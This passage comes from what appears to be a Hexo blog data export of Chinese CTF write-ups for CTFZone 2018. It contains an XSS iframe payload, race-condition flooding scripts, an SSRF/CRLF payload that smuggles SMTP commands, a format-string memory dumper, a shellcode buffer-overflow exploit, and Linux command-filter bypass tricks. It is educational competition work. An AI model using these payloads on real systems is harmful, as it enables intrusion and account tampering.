XSS!&quot;)&lt;/scrip&apos;+&apos;t&gt;&apos;;</span><br></pre></td></tr></table></figure>\n<p>接下来一次在控制台中输入:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">window.location = &apos;http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=%22%3E%3Ciframe%20onload=srcdoc=window.name%3E&apos;;</span><br></pre></td></tr></table></figure>\n<p>发现成功弹窗户。</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803214831.png\" alt=\"\"></p>\n<p>在次输入:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">window.location = &apos;http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=%22%3E%3Ciframe%20onload=window.name%3E&apos;;</span><br></pre></td></tr></table></figure>\n<p>我们会发现，再不添加<code>srcdoc</code>参数的情况下，不在弹窗。</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803214950.png\" alt=\"\"></p>\n<p>getflag:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">window.name = `</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">window.frameElement.onload=null;</span><br><span class=\"line\">console.log(window.parent.document.body.innerHTML);</span><br><span class=\"line\">function elo()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">document.getElementById(&apos;cudo&apos;).onload=null;</span><br><span class=\"line\">r = document.getElementById(&apos;cudo&apos;).contentWindow.document;</span><br><span class=\"line\">r.getElementsByName(&apos;user_uuid&apos;)[0].value = &apos;dbb306dd-28c1-4333-88ba-9588842f08e0&apos;;</span><br><span class=\"line\">r.getElementsByName(&apos;status&apos;)[0].value = &apos;premium&apos;;</span><br><span class=\"line\">r.getElementById(&apos;user_manage&apos;).submit();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">`</span><br><span class=\"line\">window.name += &apos;&lt;/scrip&apos;+&apos;t&gt;&lt;iframe src=&quot;/manage.php&quot; onload=&quot;elo()&quot; id=&quot;cudo&quot;&gt;&apos;;</span><br><span class=\"line\">window.location = &apos;http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=%22%3E%3Ciframe%20onload=srcdoc=window.name%3E&apos;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"MMORPG-3000\"><a href=\"#MMORPG-3000\" class=\"headerlink\" title=\"MMORPG 3000\"></a>MMORPG 3000</h2><ol>\n<li><p>注册登录</p>\n</li>\n<li><p>在<code>Donate</code>页面获取免费武器。</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803220511.png\" alt=\"\"></p>\n<p>图片url:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_96c5c28becf18e71190460a9955aa4d8.png</span><br></pre></td></tr></table></figure>\n<p>其中：</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803220606.png\" alt=\"\"></p>\n<p>此时，userid为860。</p>\n</li>\n<li><p>获取更多<code>coupon</code></p>\n<p>根据上边得到结果，我们可以测试一下 <code>859</code></p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803221240.png\" alt=\"\"></p>\n<p>得到url:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_537de305e941fccdbba5627e3eefbb24.png</span><br></pre></td></tr></table></figure>\n<p>访问该url:</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803221334.png\" alt=\"\"></p>\n<p>得到新的<code>Coupon</code></p>\n<blockquote>\n<p>f598109a-942c</p>\n</blockquote>\n<p><img src=\"/assets/ctfzone/TIM截图20180803221422.png\" alt=\"\"></p>\n<p>成功长了1分。</p>\n<p>这时候，测试<code>1</code>.</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803221713.png\" alt=\"\"></p>\n<p>得到url:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_6512bd43d9caa6e02c990b0a82652dca.png</span><br></pre></td></tr></table></figure>\n<p><img src=\"/assets/ctfzone/TIM截图20180803221807.png\" alt=\"\"></p>\n<p>然后就可以再次得到1337分，并升级。</p>\n</li>\n<li><p>到达30级，新的问题。</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803221945.png\" alt=\"\"></p>\n<p>无法继续升级。</p>\n</li>\n<li><p>条件竞争。</p>\n<p>这里猜测应该是条件竞争，这里猜测应该是执行数据库插入操作，高并发的情况下，导致重复插入多次。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function levelup() &#123;</span><br><span class=\"line\">    balance &gt; 10:</span><br><span class=\"line\">    是:</span><br><span class=\"line\">    \tlevel &gt; 30:</span><br><span class=\"line\">    \t是:</span><br><span class=\"line\">    \t\texit</span><br><span class=\"line\">    \t否:</span><br><span class=\"line\">    \t\tlevel++                 |</span><br><span class=\"line\">    \t\tbalance -= 10           |    在并发的情况下，没有锁的情况下，多个线程会同时进入该代码段 </span><br><span class=\"line\">    \t\tinsert into table       | </span><br><span class=\"line\">    否:</span><br><span class=\"line\">    \texit</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>并发方案1：</p>\n<p>创建1个账号，获取足够的balance。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import threading</span><br><span class=\"line\"></span><br><span class=\"line\">threadArray = []</span><br><span class=\"line\"></span><br><span class=\"line\">class expClass(threading.Thread):</span><br><span class=\"line\">    burp0_url = &quot;http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one:80/donate/lvlup&quot;</span><br><span class=\"line\">    burp0_cookies = &#123;&quot;session&quot;: &quot;eyJ1aWQiOjg2NX0.Dkaijg.3FkM2nEU3xLcIvc4DPkZxkvrjFQ&quot;&#125;</span><br><span class=\"line\">    burp0_headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-GB,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Referer&quot;: &quot;http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/info&quot;, &quot;DNT&quot;: &quot;1&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;&#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    def __init__(self, numMain):</span><br><span class=\"line\">        super(expClass, self).__init__()</span><br><span class=\"line\"></span><br><span class=\"line\">    def ham(self):</span><br><span class=\"line\">        requests.get(self.burp0_url, headers=self.burp0_headers, cookies=self.burp0_cookies)</span><br><span class=\"line\"></span><br><span class=\"line\">        </span><br><span class=\"line\">    def run(self):</span><br><span class=\"line\">        self.ham()</span><br><span class=\"line\">        </span><br><span class=\"line\">thr = 900</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(0, thr ):</span><br><span class=\"line\">        threadcan = expClass(i)</span><br><span class=\"line\">        threadArray.append(threadcan)</span><br><span class=\"line\">        </span><br><span class=\"line\">for i in range(0, thr):</span><br><span class=\"line\">        threadArray[i].start()</span><br><span class=\"line\">        print &quot;G thread girdi =&gt; &quot; + str(i)</span><br><span class=\"line\">for i in range(0, thr):</span><br><span class=\"line\">        threadArray[i].join()</span><br><span class=\"line\">        print &quot;R thread cikti =&gt; &quot; + str(i)</span><br></pre></td></tr></table></figure>\n<p>并发方案2：</p>\n<p>首先创建两个新的账号，并获取足够的balance。</p>\n<p>race_condition.py</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import threading</span><br><span class=\"line\">import requests</span><br><span class=\"line\">from Queue import Queue</span><br><span class=\"line\"></span><br><span class=\"line\">max = 100</span><br><span class=\"line\">threads = Queue()</span><br><span class=\"line\"></span><br><span class=\"line\">def lvlup(cookie):</span><br><span class=\"line\">    threads.get()</span><br><span class=\"line\">    url = &quot;http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/donate/lvlup&quot;</span><br><span class=\"line\">    r = requests.get(url, cookies=&#123;&quot;session&quot;: cookie&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def worker2(index):</span><br><span class=\"line\">    lvlup(&quot;eyJ1aWQiOjg2MX0.DkX_wQ.Mvm0XsHQF4JnYmca6pt8z-vUkaE&quot;)       # chrome</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def worker(index):</span><br><span class=\"line\">    lvlup(&quot;eyJ1aWQiOjg2Mn0.DkX_zA.egXto8_Qdii7FNhj43zKekmtYP0&quot;)         # firefox</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def race():</span><br><span class=\"line\">    for i in range(max):</span><br><span class=\"line\">        thread = threading.Thread(target=worker, args=[i])</span><br><span class=\"line\">        thread.start()</span><br><span class=\"line\">    for i in range(max):</span><br><span class=\"line\">        thread = threading.Thread(target=worker2, args=[i])</span><br><span class=\"line\">        thread.start()</span><br><span class=\"line\">    for i in range(max * 2):</span><br><span class=\"line\">        threads.put(i)</span><br><span class=\"line\">    threads.join()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">race()</span><br></pre></td></tr></table></figure>\n<p>结果：</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803232555.png\" alt=\"\"></p>\n</li>\n<li><p>SSRF</p>\n<p>通过条件竞争，到达31级别，出现了新的页面。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar</span><br></pre></td></tr></table></figure>\n<p>这里存在ssrf漏洞。</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803234111.png\" alt=\"\"></p>\n<p>通过测试，可以发现过滤了<code>127.0.0.1</code>, <code>localhost</code>,可以通过<code>0.0.0.0</code>或者<code>127.0.0.2</code> bypass。</p>\n<p>端口扫描:</p>\n<p>示意图如下：</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803234335.png\" alt=\"\"></p>\n</li>\n</ol>\n<p>   经过测试，发现25端口开放。</p>\n<p>   <img src=\"/assets/ctfzone/port_scan.png\" alt=\"\"></p>\n<p>   这里存在http header注入(CRLF注入)</p>\n<p>   构造paylaod:</p>\n   <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Host: [0.0.0.0</span><br><span class=\"line\">helo 1v3m</span><br><span class=\"line\">mail from:&lt;qaewjlfnwej@o3enzyme.com&gt;</span><br><span class=\"line\">rcpt to:&lt;root&gt;</span><br><span class=\"line\">data</span><br><span class=\"line\">subject: give me flag</span><br><span class=\"line\"></span><br><span class=\"line\">1v3m</span><br><span class=\"line\">.</span><br><span class=\"line\">]:25</span><br></pre></td></tr></table></figure>\n<p>   最终payload:</p>\n   <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[0.0.0.0%0ahelo 1v3m%0amail from:&lt;qaewjlfnwej@o3enzyme.com&gt;%0arcpt to:&lt;root&gt;%0adata%0asubject: give me flag%0a%0a1v3m%0a.%0a]:25</span><br></pre></td></tr></table></figure>\n<ol start=\"7\">\n<li><p>solution1:</p>\n<p>最终请求包:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /user/avatar HTTP/1.1</span><br><span class=\"line\">Host: web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: en-GB,en;q=0.5</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Referer: http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar</span><br><span class=\"line\">Content-Type: multipart/form-data; boundary=---------------------------4693211868403427471435307016</span><br><span class=\"line\">Content-Length: 581</span><br><span class=\"line\">Cookie: session=eyJ1aWQiOjgyN30.DjaSgA.ylhJXkstamQ7GahYWvUypKpvDQc</span><br><span class=\"line\">DNT: 1</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\"></span><br><span class=\"line\">-----------------------------4693211868403427471435307016</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;&quot;</span><br><span class=\"line\">Content-Type: application/octet-stream</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">-----------------------------4693211868403427471435307016</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;url&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">https://[0.0.0.0%0ahelo 1v3m%0amail from:&lt;qaewjlfnwej@o3enzyme.com&gt;%0arcpt to:&lt;root&gt;%0adata%0asubject: give me flag%0a%0a1v3m%0a.%0a]:25</span><br><span class=\"line\">-----------------------------4693211868403427471435307016</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;action&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">save</span><br><span class=\"line\">-----------------------------4693211868403427471435307016--</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>solution2</p>\n<p>参考网址：<a href=\"https://github.com/p4-team/ctf/tree/master/2018-07-21-ctfzone-quals/web_mmorpg\" target=\"_blank\" rel=\"noopener\">https://github.com/p4-team/ctf/tree/master/2018-07-21-ctfzone-quals/web_mmorpg</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HELO 127.0.0.1</span><br><span class=\"line\">MAIL FROM:&lt;A@B.c&gt;</span><br><span class=\"line\">RCPT TO:&lt;1096026150@qq.com&gt;</span><br><span class=\"line\">DATA</span><br><span class=\"line\">From: AAA@B.C</span><br><span class=\"line\">To: 1096026150@qq.com</span><br><span class=\"line\">Subject: give me flag</span><br><span class=\"line\">.</span><br><span class=\"line\">QUIT</span><br></pre></td></tr></table></figure>\n<p>payload1:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl &apos;web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar&apos; -H &apos;Cookie: session=eyJ1aWQiOjg2NX0.Dkan9A.U5_9q25Izo0Y4yJq__o2oAdRAc0&apos; --data &apos;url=https://127.0.0.2%0d%0aHELO 127.0.0.2%0aMAIL FROM: &lt;A@B.C&gt;%0aRCPT TO: &lt;1096026150@qq.com&gt;%0aDATA%0aFROM: AAA@B.C%0aTO: 1096026150@qq.com%0aSUBJECT: GIB%0d%0a.%0d%0a%0aQUIT%0a:25&amp;action=save&apos;</span><br></pre></td></tr></table></figure>\n<p>注意，<code>url</code>需要使用<code>https</code>,ip地址除了<code>127.0.0.2</code>,也可以使用<code>0.0.0.0</code>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#define DEF_SMTPD_FORBID_CMDS    &quot;CONNECT GET POST&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">        /* Ignore smtpd_forbid_cmds lookup errors. Non-critical feature. */</span><br><span class=\"line\">        if (cmdp-&gt;name == 0) &#123;</span><br><span class=\"line\">        state-&gt;where = SMTPD_CMD_UNKNOWN;</span><br><span class=\"line\">        if (is_header(argv[0].strval)</span><br><span class=\"line\">            || (*var_smtpd_forbid_cmds</span><br><span class=\"line\">         &amp;&amp; string_list_match(smtpd_forbid_cmds, argv[0].strval))) &#123;</span><br><span class=\"line\">                msg_warn(&quot;non-SMTP command from %s: %.100s&quot;,</span><br><span class=\"line\">                     state-&gt;namaddr, vstring_str(state-&gt;buffer));</span><br><span class=\"line\">                smtpd_chat_reply(state, &quot;221 2.7.0 Error: I can break rules, too. Goodbye.&quot;);</span><br><span class=\"line\">                break;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n<p>原因:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Our mistake was missing the special case implemented in postfix:</span><br><span class=\"line\">There is a hardening which targets exactly what we wanted to do - using HTTP request with injected headers to smuggle SMTP commands. The way to bypass this was to use https instead of http, because in such case the initial part of the request will actually be encrypted, and SMTP will ignore it, and the Host will be in plaintext so the server will receive nice set of SMTP commands. </span><br><span class=\"line\">简单来说，就是当我们使用http请求，并使用 http header注入 来注入SMTP命令的时候，会被拦截。可以使用 https， 因为 https 流量是加密过的，这样，SMTP会忽略该流量，当流量到达主机，会被解密，这时候SMTP就会收到一组漂亮的 SMTP 命令。</span><br></pre></td></tr></table></figure>\n<p>结果:</p>\n<p><img src=\"/assets/ctfzone/TIM截图20180803235132.png\" alt=\"\"></p>\n</li>\n</ol>\n<h1 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a>PWN</h1><h2 id=\"easypwn-strings\"><a href=\"#easypwn-strings\" class=\"headerlink\" title=\"easypwn_strings\"></a>easypwn_strings</h2><p>dump.py:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">def conn():</span><br><span class=\"line\">    return remote(&apos;pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one&apos;, 1234)</span><br><span class=\"line\"></span><br><span class=\"line\">def dump(adr,frmt=&apos;p&apos;):</span><br><span class=\"line\">    r.recvuntil(&apos;StrRemoveLastSymbols&apos;)</span><br><span class=\"line\">    r.recvuntil(&apos;\\n&apos;)</span><br><span class=\"line\">    r.sendline(&apos;3&apos;)</span><br><span class=\"line\">    r.recvuntil(&apos;:&apos;)</span><br><span class=\"line\">    r.recvuntil(&apos;\\n&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">    leak_part = &quot;|%19$&#123;&#125;|&quot;.format(frmt)</span><br><span class=\"line\">    out = leak_part.ljust(4*10,&quot;A&quot;)+&quot;EOF_&quot;+p32(adr)</span><br><span class=\"line\">    r.sendline(out)</span><br><span class=\"line\">    r.sendline(&apos;0&apos;)</span><br><span class=\"line\">    r.recvuntil(&apos;Result:&apos;)</span><br><span class=\"line\">    return r.recvuntil(&quot;|A&quot;)[:-2].split(&quot;|&quot;)[1]</span><br><span class=\"line\"></span><br><span class=\"line\">start_addr = 0x8048750</span><br><span class=\"line\"></span><br><span class=\"line\">while True:</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        fd = open(&quot;dumped_file&quot;,&quot;a&quot;)</span><br><span class=\"line\">        r = conn()</span><br><span class=\"line\">        data = dump(start_addr,&apos;s&apos;)</span><br><span class=\"line\">        print &quot;|0x%08x|%s|&quot; % (start_addr,data)</span><br><span class=\"line\">        if data == &quot;(null)&quot; or data == &quot;&quot;:</span><br><span class=\"line\">            fd.write(&quot;\\x00&quot;)</span><br><span class=\"line\">            start_addr += 1</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            fd.write(data+&quot;\\x00&quot;)</span><br><span class=\"line\">            start_addr += len(data)+1</span><br><span class=\"line\">        fd.close()</span><br><span class=\"line\">        r.close()</span><br><span class=\"line\">    except Exception as e:</span><br><span class=\"line\">        print e</span><br><span class=\"line\">        print &quot;[!] execption&quot;</span><br><span class=\"line\">        break</span><br></pre></td></tr></table></figure>\n<p>payload.py:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python2</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\">def recvlines(lnum):</span><br><span class=\"line\">    global p</span><br><span class=\"line\">    res=&quot;&quot;</span><br><span class=\"line\">    for x in range(lnum):</span><br><span class=\"line\">        res+=p.recvline()</span><br><span class=\"line\">    return res</span><br><span class=\"line\"> </span><br><span class=\"line\">host=&quot;pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one&quot;</span><br><span class=\"line\">port=1234</span><br><span class=\"line\"> </span><br><span class=\"line\">base_buf=0x80492e0</span><br><span class=\"line\">shellcode=&quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&quot;</span><br><span class=\"line\">payload=(&quot;y&quot;+shellcode).ljust(256,&quot;\\x90&quot;)+p32(base_buf+1)</span><br><span class=\"line\">p=remote(host,port)</span><br><span class=\"line\">#p=process(&quot;./babypwn&quot;)</span><br><span class=\"line\">print recvlines(4)</span><br><span class=\"line\">p.sendline(&quot;X&quot;)</span><br><span class=\"line\">print recvlines(3)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n"},{"title":"linux命令执行","date":"2018-06-04T03:23:22.000Z","_content":"\n## linux下执行命令绕过字符串过滤\n\n1. 字符串拼接\n\n   > 'l''s'\n   >\n   > 'ls''-a''l'\n\n2. 文件名绕过\n\n   > cat 'fl''ag'\n   >\n   > cat 'fl*'\n   >\n   > cat 'fl??'\n\n## find命令执行\n\n> find /tmp -iname sth -or -exec ls \\;                会多次执行\n>\n> find /tmp -iname sth -or -exec ls \\; -quit        只执行一次","source":"_posts/linux命令执行.md","raw":"---\ntitle: linux命令执行\ndate: 2018-06-04 11:23:22\ntags: ctf\n---\n\n## linux下执行命令绕过字符串过滤\n\n1. 字符串拼接\n\n   > 'l''s'\n   >\n   > 'ls''-a''l'\n\n2. 文件名绕过\n\n   > cat 'fl''ag'\n   >\n   > cat 'fl*'\n   >\n   > cat 'fl??'\n\n## find命令执行\n\n> find /tmp -iname sth -or -exec ls \\;                会多次执行\n>\n> find /tmp -iname sth -or -exec ls \\; -quit        只执行一次","slug":"linux命令执行","published":1,"updated":"2018-06-25T12:00:14.735Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12h0000dqkdlexmzganc","content":"<h2 id=\"linux下执行命令绕过字符串过滤\"><a href=\"#linux下执行命令绕过字符串过滤\" class=\"headerlink\" 